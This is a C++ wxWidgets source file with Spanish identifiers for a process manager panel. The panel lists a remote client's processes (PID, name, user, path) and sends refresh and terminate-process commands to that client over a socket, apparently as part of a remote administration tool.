#include "panel_process_manager.hpp"
#include "frame_client.hpp"
#include "misc.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(ListCtrlManager2, wxListCtrl)
	EVT_MENU(EnumIDS::ID_PM_Refrescar, ListCtrlManager2::OnRefrescar)
	EVT_MENU(EnumIDS::ID_PM_Kill, ListCtrlManager2::OnTerminarPID)
	EVT_CONTEXT_MENU(ListCtrlManager2::OnContextMenu)
wxEND_EVENT_TABLE()

panelProcessManager::panelProcessManager(wxWindow* pParent, SOCKET sck, std::string _strID) :
	wxFrame(pParent, EnumIDS::ID_PM_Panel, "[" + _strID + "] Administrador de procesos") {

	this->sckCliente = sck;
	this->SetName(_strID + "-PM");
	
	this->CrearListview();

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void panelProcessManager::CrearListview() {
	this->listManager = new ListCtrlManager2(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxDefaultSize, wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
	
	this->listManager->sckCliente = this->sckCliente;

	wxListItem itemCol;
	itemCol.SetText("PID");
	itemCol.SetWidth(50);
	itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
	this->listManager->InsertColumn(0, itemCol);

	itemCol.SetText("Nombre");
	itemCol.SetAlign(wxLIST_FORMAT_LEFT);
	itemCol.SetWidth(200);
	this->listManager->InsertColumn(1, itemCol);

	itemCol.SetText("Usuario");
	itemCol.SetWidth(150);
	this->listManager->InsertColumn(2, itemCol);

	itemCol.SetText("Ruta");
	itemCol.SetWidth(400);
	this->listManager->InsertColumn(3, itemCol);

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	sizer->Add(this->listManager, 1, wxEXPAND | wxALL, 2);
	this->SetSizerAndFit(sizer);

}

void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
	this->DeleteAllItems();
	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::PM_Refrescar);
}

void ListCtrlManager2::OnTerminarPID(wxCommandEvent& event) {
	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
	std::string strComando = this->GetItemText(item, 0);
	p_Servidor->cChunkSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false, EnumComandos::PM_Kill);
}

void ListCtrlManager2::AgregarData(std::string strBuffer, std::string _strPID){
	// PID ~ pNAME ~ HOST/USER ~ PATH|
	std::vector<std::string> vc_Proc = strSplit(strBuffer, '|', 2000);
	int iCount = 0;
	for (auto aProceso : vc_Proc) {
		std::vector<std::string> vc_Detail = strSplit(aProceso, '>', 4);
		if (vc_Detail.size() == 4) {
			this->InsertItem(iCount, vc_Detail[0]);
			this->SetItem(iCount, 1, vc_Detail[1]);
			this->SetItem(iCount, 2, vc_Detail[2]);
			this->SetItem(iCount, 3, vc_Detail[3]);

			if (vc_Detail[0] == _strPID) { //PID del cliente
				this->SetItemTextColour(iCount, *wxRED);
			}
			iCount++;
		}
	}
}

void ListCtrlManager2::ShowContextMenu(const wxPoint& pos, bool isEmpty) {
	wxMenu menu;

	if (isEmpty) {
		menu.Append(EnumIDS::ID_PM_Refrescar, "Refrescar");
	}else {
		menu.Append(EnumIDS::ID_PM_Refrescar, "Refrescar");
		menu.AppendSeparator();
		menu.Append(EnumIDS::ID_PM_Kill, "Terminar proceso");
	}

	PopupMenu(&menu, pos.x, pos.y);
	
}

void ListCtrlManager2::OnContextMenu(wxContextMenuEvent& event) {
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		ShowContextMenu(point, iItem == -1 ? true : false);

	}
	else {
		event.Skip();
	}
}